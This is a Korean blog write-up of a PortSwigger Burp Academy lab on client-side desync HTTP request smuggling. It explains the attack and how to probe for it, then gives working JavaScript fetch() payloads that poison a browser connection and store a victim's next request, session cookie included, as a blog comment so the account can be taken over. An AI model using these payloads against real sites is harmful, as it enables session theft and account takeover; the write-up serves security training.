---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Client-side desync"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-03-18 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 여기서부터는 웹 브라우저로 공격가능한 요청 스머글링 패턴을 다룬다.
- 이는 2022년 8월에 발표된 James Kettle의 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks)에 기초한 내용이다. 
- HTTP Request Smuggling 취약점 문제 19번부터 22번까지 네 개 문제는 이와 관련된 내용이다.
- 문제 주소: https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync
- 취약점 설명페이지(개요): https://portswigger.net/web-security/request-smuggling/browser
- 취약점 설명페이지(Client-side desync 상세): https://portswigger.net/web-security/request-smuggling/browser/client-side-desync
- 난이도: EXPERT (어려움)


# Client-side desync 
## Client-side desync 공격이란?
CSD는 대략 다음과 같은 스텝으로 진행된다. 

1. victim이 악의적인 자바스크립트를 제공하는 어떤 도메인의 웹 페이지를 방문한다. 

2. 자바스크립트는 victim의 브라우저가 어떤 취약한 웹사이트에 요청을 보내도록 만든다. 여기에는 일반적인 리퀘스트 스머글링 공격과 비슷하게 공격자가 컨트롤가능한 요청 prefix(악의적인 prefix)가 포함된다. 

3. 악의적인 prefix는 서버가 첫번째 요청(initial request)에 응답한 후에도 서버의 TCP/TLS소켓에 남는다. (victim의 브라우저와 서버 사이의 커넥션이 오염된 상태다.)

4. 자바스크립트는 새로운 요청을 오염된 커넥션을 통해서 보낸다. 이는 악의적인 prefix뒤에 추가된다. 그 결과 서버로부터 (유저에게)해로운 반응을 이끌어낸다. 


## Client-side desync 취약점 테스트하기 
브라우저를 통해 공격을 수행시켜야 하는 복잡함때문에 CSD를 테스트할 때는 다음 스텝을 통해 체계적으로 접근하는게 좋다. 

1. Probe for potential desync vectors in Burp.
2. Confirm the desync vector in Burp.
3. Build a proof of concept to replicate the behavior in a browser.
4. Identify an exploitable gadget.
5. Construct a working exploit in Burp.
6. Replicate the exploit in your browser.

1. Client-side desync vector 조사(probing)하기
CSD 테스트의 첫번째 단계는 CL헤더를 무시하는 엔드포인트를 찾는 것, 혹은 CL헤더를 무시하도록 만들 수 있는 요청을 만드는 것이다. 
이를 테스트하는 가장 간단한 방법은 실제 컨텐츠의 길이보다 긴 CL헤더 값을 보내보는 것이다. 
- 만약 응답이 돌아오지 않고 계속 대기상태이거나 서버측에서 타임아웃 에러가 발생하면, 이는 서버측에서 부족한 바이트분의 데이터를 기다리고 있다는 신호가 된다. 
- 만약 응답이 즉각 돌아온다면 CSD 공격이 가능할 수도 있는 엔드포인트를 찾은 것이 된다. 이 엔드포인트는 추가 조사의 대상이 된다. 

CL.0와 마찬가지로, 가장 가능성이 높은 곳은 POST 요청이 기대되지 않는 곳이다. 예를 들면 **정적인 파일을 제공하거나 서버레벨에서 리다이렉트(redirect)를 수행하는 곳**이다. 

혹은 서버에러를 일으킴으로서 CL헤더를 무시하는 서버반응을 유발할 수 있다. 

2. vector를 확신(컨펌)하기
실제로 스머글링하는 POC으로 컨펌한다. 

3. 브라우저에서 사용할 수 있는 POC 만들기 
2번의 POC을 브라우저에서도 재현가능한지 확인해본다. 

## Client-side desync 취약점 익스플로잇하기 
### Client-side variations of classic attacks

### Client-side cache poisoning

#### Poisoning the cache with a redirect

#### Triggering the resource import

#### Delivering a payload

### Pivoting attacks against internal infrastructure

# 랩 개요
- 이 랩은 Client-side desync 공격에 취약하다. 어떤 엔드포인트에서는 서버가 CL헤더를 무시하기 때문이다. 이를 이용해 victim이 자신의 세션쿠키를 노출하도록 만들 수 있다. 
- 랩을 풀려면 다음 순서대로 진행하면 된다. 
1. Burp에서 client-side desync 벡터를 테스트하고 사용할 수 있는 것을 찾는다. 그리고 그 것을 웹 브라우저에서도 사용할 수 있는지 확인한다. 
2. 어플리케이션에서 텍스트 데이터를 저장하는 부분을 찾는다. 
3. 위 두개를 결합해서 victim의 브라우저가 몇 개의 연속되는 크로스 도메인 요청을 하도록 만들어서 세션 쿠기를 노출시키도록 만든다. 
4. 훔친 쿠키를 사용해서 victim의 계정에 접근한다. 

```
This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.

To solve the lab:

1. Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.
2. Identify a gadget that enables you to store text data within the application.
3. Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.
4. Use the stolen cookie to access the victim's account.
```

# 풀이 

1. Burp Scanner로 돌려본다. `POST /`엔드포인트에서 CSD가 검출되었다. 

![](/images/burp-academy-hrs-20-1.png)

2. 수동으로도 체크해본다. Detect단계에서 사용하는 테크닉을 사용해본다. 실제보다 CL값이 큰 요청을 보내보면, `/en` 엔드포인트는 타임아웃이 발생하지만 `/` 엔드포인트는 바로 응답이 온다. 

3. Confirm단계로 들어간다. Burp 로 확인해본다. 두번재 탭에서 404응답이 확인된다. 스머글링에 성공한 것이다.

![](/images/burp-academy-hrs-20-2.png)

![](/images/burp-academy-hrs-20-3.png)


4. 웹 브라우저로 확인해본다. 동일하게 404응답이 확인된다. 브라우저로도 재현이 가능한 것을 확인했다. 


```javascript
fetch('https://0abc00fc0374ea7b8303055000f900df.h1-web-security-academy.net', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://0abc00fc0374ea7b8303055000f900df.h1-web-security-academy.net', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

![](/images/burp-academy-hrs-20-4.png)

5. Exploit단계로 들어간다. 블로그 글에 커멘트를 남기는 기능을 이용한다. 두 번째 탭에서 302응답이 확인되었다. 두번째 탭의 요청이 글 작성 요청의 바디로 해석된 것이다. 

![](/images/burp-academy-hrs-20-5.png)

![](/images/burp-academy-hrs-20-6.png)

결과는 다음과 같다. 두번째 탭의 요청의 일부가 커멘트로 저장되었다. 이 것은 첫번째 탭에서 지정한 스머글링 요청의 CL값 만큼 저장된 것이다. 여기서 CL값이 너무 크면 타임아웃이 발생한다. 

![](/images/burp-academy-hrs-20-11.png)


6. 웹 브라우저로도 재현해본다. 

```
fetch('https://0abc00fc0374ea7b8303055000f900df.h1-web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0abc00fc0374ea7b8303055000f900df.h1-web-security-academy.net\r\nCookie: session=OTv7VATL32x943RTb5XTmk5q15k1by1N; _lab_analytics=yu7rszsAe5yU3WQxzN03QbJ1ni2IEZGBJIXQmfvnBdgZJt1FiuorBqsov9ZNCmBW5EYpbUwznbIjgR8oLWM07rJ4MQRXpppNcnGuRcURlFfhKPNdb2ds4PF79nb9r9uDqVbBsaZabWjtXVfdpBjPuM6t8XEHjWfm315oMQwTq8CDbOL4MZLqrMZ1hMsiwbVtFMXVgdFKfQlfoiuhUtTZZs1K1vDenk1bWyCzXO5RFuzkEHhhMsw0oEpNIMLHINXD\r\nContent-Length: 150\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=ckTPQt7cEB3bGUkygZhDXM6Fg2p2dieC&postId=2&name=tester2&email=teser@ginandjuice.shop&website=&comment=test',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0abc00fc0374ea7b8303055000f900df.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

어라.. 잘 되지 않는다. 404응답이 돌아온다. 여기서 삽질을 좀 했다. 결국 알아낸 것. 주의점! 웹 브라우저로 테스트할 때는 Burp 를 통하지 않도록 한다. Burp를 통하면 Connection: close가 들어가 버려 제대로된 테스트 결과가 나오지 않는 것 같다. 


![](/images/burp-academy-hrs-20-7.png)

Burp 를 통하지 않고 바로 랩 서버로 접근하도록 하자 결과가 잘 나왔다. 

![](/images/burp-academy-hrs-20-8.png)

7. 이제 exploit서버에 이 요청을 저장한다. `<script>`태그로 감싸는 것을 잊지 않아야 한다.  Deliver to victim을 눌러서 결과를 확인해본다. Session 쿠키 값을 얻어낼 때까지 Content-Length 값을 계속 늘린다. 900일 때 다음과 같이 세션쿠키 값을 얻어낼 수 있었다. 

![](/images/burp-academy-hrs-20-8.png)

8. 이 세션쿠키 값으로 랩에 접근하면 문제가 풀렸다는 메시지가 표시된다. 

![](/images/burp-academy-hrs-20-10.png)